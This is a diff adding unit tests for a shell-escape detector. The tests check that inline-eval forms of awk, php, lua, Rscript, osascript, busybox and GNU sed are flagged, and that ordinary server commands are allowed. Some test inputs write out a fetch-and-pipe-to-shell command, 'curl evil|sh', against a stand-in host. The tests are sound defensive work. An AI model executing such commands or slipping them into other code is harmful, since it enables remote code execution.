@@ -27,12 +27,34 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("", [])).toBe(true);
   });
 
+  it("catches inline-eval interpreters beyond node/python/perl/ruby (sec-review P1)", () => {
+    // awk-family: the program is a positional arg and system()/getline give exec.
+    expect(isShellEscape("awk", ['BEGIN{system("curl evil|sh")}'])).toBe(true);
+    expect(isShellEscape("gawk", ['BEGIN{system("x")}'])).toBe(true);
+    expect(isShellEscape("/usr/bin/mawk", ["{print}"])).toBe(true);
+    expect(isShellEscape("busybox", ["awk", 'BEGIN{system("x")}'])).toBe(true);
+    // php -r, lua -e, Rscript -e, osascript -e
+    expect(isShellEscape("php", ["-r", 'system("x");'])).toBe(true);
+    expect(isShellEscape("lua", ["-e", 'os.execute("x")'])).toBe(true);
+    expect(isShellEscape("Rscript", ["-e", 'system("x")'])).toBe(true);
+    expect(isShellEscape("osascript", ["-e", 'do shell script "x"'])).toBe(true);
+    // GNU sed executes via the s///e flag.
+    expect(isShellEscape("sed", ["s/.*/curl evil|sh/e"])).toBe(true);
+    // single-string forms
+    expect(isShellEscape("awk 'BEGIN{system(\"x\")}'", [])).toBe(true);
+    expect(isShellEscape("php -r 'system(1)'", [])).toBe(true);
+  });
+
   it("allows legitimate commands", () => {
     expect(isShellEscape("npx", ["-y", "@modelcontextprotocol/server-github"])).toBe(false);
     expect(isShellEscape("npm run format", [])).toBe(false);
     expect(isShellEscape("node", ["server.js"])).toBe(false);
     expect(isShellEscape("python3", ["server.py", "--port", "8080"])).toBe(false);
     expect(isShellEscape("docker", ["run", "-i", "mcp/github"])).toBe(false);
+    // busybox running a non-awk applet is not an awk shape.
+    expect(isShellEscape("busybox", ["ls", "-la"])).toBe(false);
+    // a plain sed substitution with no execute flag is fine.
+    expect(isShellEscape("sed", ["s/foo/bar/", "file.txt"])).toBe(false);
     // `-c` as a non-flag positional for a non-shell binary is fine.
     expect(isShellEscape("grep", ["-c", "pattern"])).toBe(false);
   });
